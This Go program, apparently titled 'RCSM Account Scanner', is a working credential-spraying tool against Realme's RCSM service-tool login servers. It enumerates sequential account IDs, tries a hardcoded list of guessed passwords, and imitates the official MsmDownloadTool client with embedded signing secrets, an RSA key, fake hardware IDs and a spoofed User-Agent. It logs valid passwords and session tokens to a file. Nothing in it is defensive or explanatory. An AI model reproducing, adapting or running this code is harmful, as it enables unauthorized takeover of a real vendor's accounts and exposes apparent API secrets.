package main

import (
	"crypto/md5"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const pubKeyPEM = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvKQDEFoKtFkEE1ITBAE0
faVTEjzVWMSH1VD3PzpREBxrwJSQwNAXzQfAcYXa/0NrIf3LWWPhQ63P6s2H/aFH
HIcZsJx9ASn4RZOKRFGShujUbF6iSOmjM6td2FpzyToNo+gxN5IJ9PAC5oCW9tlu
li66+vdkGTtK8M0fZpHhsTJNgWOtqOOCGqtHsk54atr6zoVTNKb492GHLBumirZb
MPMgMhIVJP0+ph35lDDB5n6Q1VyhgNjv1QrIdPhKFmzmzgD6xSZ0pPTh9HwYZdY0
sRpKD4kzWpz9S1lFdTU7OmqULuurZUPdUGniG1hjhE+vdmZQM2QynC4VJLWCFXIc
wwIDAQAB
-----END PUBLIC KEY-----`

var (
	passwords = []string{"RCSM-P@ssw0rd", "realme*888K", "RCSM@123", "RCSM123", "RCSM-123", "realme@123", "realme123", "realme*123"}
	servers   = map[string][2]string{
		"SG": {"https://rcsm-sg.realmeservice.com/api/tools/login", "dad18bcb-1aee-45c6-bf0d-994fd28d7534"},
		"CN": {"https://rcsm-cn.realmeservice.com/api/tools/login", "1557a67f-24c9-4bd4-845d-716e86723064"},
		"IN": {"https://rcsm-in.realmeservice.com/api/tools/login", "1a8fc48b-a114-4dbc-9592-7171273af020"},
		"EU": {"https://rcsm-eu.realmeservice.com/api/tools/login", "36b655ac-f2b9-4d7b-9068-77573f09e932"},
	}

	httpClient = &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        200,
			MaxIdleConnsPerHost: 50,
			IdleConnTimeout:     30 * time.Second,
		},
	}
)

func encryptRSA(pubPEM string, plaintext []byte) (string, error) {
	block, _ := pem.Decode([]byte(pubPEM))
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return "", err
	}
	rsaPub := pub.(*rsa.PublicKey)
	keySize := rsaPub.Size()
	bufSize := keySize - 11
	var encrypted []byte
	for i := 0; i < len(plaintext); i += bufSize {
		end := i + bufSize
		if end > len(plaintext) {
			end = len(plaintext)
		}
		chunk, err := rsa.EncryptPKCS1v15(rand.Reader, rsaPub, plaintext[i:end])
		if err != nil {
			return "", err
		}
		encrypted = append(encrypted, chunk...)
	}
	return base64.StdEncoding.EncodeToString(encrypted), nil
}

func md5Hash(s string) string {
	h := md5.Sum([]byte(s))
	return hex.EncodeToString(h[:])
}

func buildSign(method, secret string, params map[string]string) string {
	keys := make([]string, 0, len(params))
	for k := range params {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var sb strings.Builder
	sb.WriteString(method + "\n")
	for _, k := range keys {
		sb.WriteString(k + "=" + params[k] + "\n")
	}
	sb.WriteString(secret)
	return md5Hash(sb.String())
}

func tryLogin(rcsmURL, secret, userID, password string) (string, string, string) {
	loginData := map[string]interface{}{
		"board_id": "VQ2MV466158", "cpu_id": "BFEBFBFF000306C3",
		"disk_id": "AA20231222512G216845", "ip": "0.0.0.0",
		"login_type": "1", "mac": "00-E0-4C-73-E7-47",
		"user_id": userID, "password": password,
		"version": "", "verification_code": "000000",
	}
	jsonData, _ := json.Marshal(loginData)
	encrypted, err := encryptRSA(pubKeyPEM, jsonData)
	if err != nil {
		return "RSA_ERR", "", ""
	}
	timestamp := fmt.Sprintf("%d", time.Now().Unix())
	md5Msg := md5Hash(encrypted)
	params := map[string]string{
		"app_id": "realme_tool", "timestamp": timestamp,
		"s_msg": encrypted, "s_msg_md_5": md5Msg,
	}
	sign := buildSign("/api/tools/login", secret, params)
	formData := url.Values{
		"app_id": {"realme_tool"}, "timestamp": {timestamp},
		"sign": {sign}, "s_msg": {encrypted}, "s_msg_md_5": {md5Msg},
	}
	req, _ := http.NewRequest("POST", rcsmURL, strings.NewReader(formData.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "MsmDownloadTool-V2.0.71-rcsm")
	req.Header.Set("Cache-Control", "no-cache")

	resp, err := httpClient.Do(req)
	if err != nil {
		return "HTTP_ERR", "", ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		return fmt.Sprintf("HTTP%d", resp.StatusCode), "", ""
	}

	var result map[string]interface{}
	if json.Unmarshal(body, &result) != nil {
		return "NON_JSON", "", ""
	}

	if data, ok := result["Data"].(map[string]interface{}); ok {
		if response, ok := data["response"].(map[string]interface{}); ok {
			msg, _ := response["message"].(string)
			token, _ := response["token"].(string)
			country, _ := response["countryname"].(string)
			return msg, token, country
		}
	}
	return "PARSE_ERR", "", ""
}

func main() {
	prefix := flag.String("prefix", "INE", "Account prefix, e.g. INE, IND, W80")
	region := flag.String("region", "IN", "Region: SG/CN/IN/EU")
	start := flag.Int("start", 0, "Start number")
	end := flag.Int("end", 99999, "End number")
	digits := flag.Int("digits", 5, "Zero-padded digit count, e.g. 5 -> INE00000")
	workers := flag.Int("workers", 20, "Concurrent workers")
	outFile := flag.String("out", "rcsm_found_ine.txt", "Output file")
	flag.Parse()

	srv, ok := servers[strings.ToUpper(*region)]
	if !ok {
		fmt.Println("Invalid region. Use: SG/CN/IN/EU")
		return
	}
	rcsmURL := srv[0]
	secret := srv[1]

	total := int64(*end - *start + 1)
	var tried, found, disabled, wrongPw, notExist, httpErr int64
	startTime := time.Now()

	f, err := os.OpenFile(*outFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		fmt.Printf("Cannot open output file: %v\n", err)
		return
	}
	defer f.Close()
	var fileMu sync.Mutex

	fmtStr := fmt.Sprintf("%s%%0%dd", *prefix, *digits)
	fmt.Printf("RCSM Account Scanner (prefix mode)\n")
	fmt.Printf("Format:    %s (e.g. %s)\n", fmtStr, fmt.Sprintf(fmtStr, *start))
	fmt.Printf("Region:    %s (%s)\n", *region, rcsmURL)
	fmt.Printf("Range:     %d -> %d (%d accounts)\n", *start, *end, total)
	fmt.Printf("Workers:   %d\n", *workers)
	fmt.Printf("Passwords: %v\n", passwords)
	fmt.Printf("Output:    %s\n\n", *outFile)

	jobs := make(chan int, *workers*2)
	var wg sync.WaitGroup

	// Progress
	go func() {
		for {
			time.Sleep(5 * time.Second)
			t := atomic.LoadInt64(&tried)
			fo := atomic.LoadInt64(&found)
			d := atomic.LoadInt64(&disabled)
			w := atomic.LoadInt64(&wrongPw)
			n := atomic.LoadInt64(&notExist)
			h := atomic.LoadInt64(&httpErr)
			elapsed := time.Since(startTime).Seconds()
			if elapsed < 1 {
				elapsed = 1
			}
			rate := float64(t) / elapsed
			var eta float64
			if rate > 0 {
				eta = float64(total-t) / rate / 60
			}
			fmt.Printf("[%s] %d/%d (%.1f/s) found=%d disabled=%d wrongPw=%d noExist=%d httpErr=%d ETA=%.0fm\n",
				time.Now().Format("15:04:05"), t, total, rate, fo, d, w, n, h, eta)
		}
	}()

	// Workers
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for num := range jobs {
				userID := fmt.Sprintf(fmtStr, num)
				var bestMsg, bestToken, bestCountry, bestPw string

				for _, pw := range passwords {
					msg, token, country := tryLogin(rcsmURL, secret, userID, pw)

					if msg == "0000" {
						bestMsg = msg
						bestToken = token
						bestCountry = country
						bestPw = pw
						break
					}
					if strings.Contains(msg, "禁用") {
						bestMsg = "DISABLED"
						bestPw = pw
						break
					}
					if msg == "3010" || msg == "3001" || strings.Contains(msg, "密码") {
						bestMsg = "WRONG_PW"
						bestPw = pw
						continue
					}
					if strings.Contains(msg, "不存在") {
						bestMsg = "NOT_EXIST"
						break
					}
					bestMsg = msg
					bestPw = pw
				}

				atomic.AddInt64(&tried, 1)

				switch bestMsg {
				case "0000":
					atomic.AddInt64(&found, 1)
					line := fmt.Sprintf("[FOUND] %s pw=%s region=%s country=%s token=%s\n",
						userID, bestPw, *region, bestCountry, bestToken)
					fmt.Print(line)
					fileMu.Lock()
					f.WriteString(line)
					fileMu.Unlock()
				case "DISABLED":
					atomic.AddInt64(&disabled, 1)
					fileMu.Lock()
					f.WriteString(fmt.Sprintf("[DISABLED] %s pw=%s region=%s\n", userID, bestPw, *region))
					fileMu.Unlock()
				case "NOT_EXIST":
					atomic.AddInt64(&notExist, 1)
				case "WRONG_PW":
					atomic.AddInt64(&wrongPw, 1)
				case "HTTP_ERR":
					atomic.AddInt64(&httpErr, 1)
				default:
					// skip
				}
			}
		}()
	}

	for i := *start; i <= *end; i++ {
		jobs <- i
	}
	close(jobs)
	wg.Wait()

	elapsed := time.Since(startTime)
	fmt.Printf("\n========== DONE ==========\n")
	fmt.Printf("Total:    %d in %s (%.1f/s)\n", total, elapsed.Round(time.Second), float64(total)/elapsed.Seconds())
	fmt.Printf("Found:    %d\n", atomic.LoadInt64(&found))
	fmt.Printf("Disabled: %d\n", atomic.LoadInt64(&disabled))
	fmt.Printf("WrongPw:  %d\n", atomic.LoadInt64(&wrongPw))
	fmt.Printf("NotExist: %d\n", atomic.LoadInt64(&notExist))
	fmt.Printf("HttpErr:  %d\n", atomic.LoadInt64(&httpErr))
	fmt.Printf("Results:  %s\n", *outFile)
}
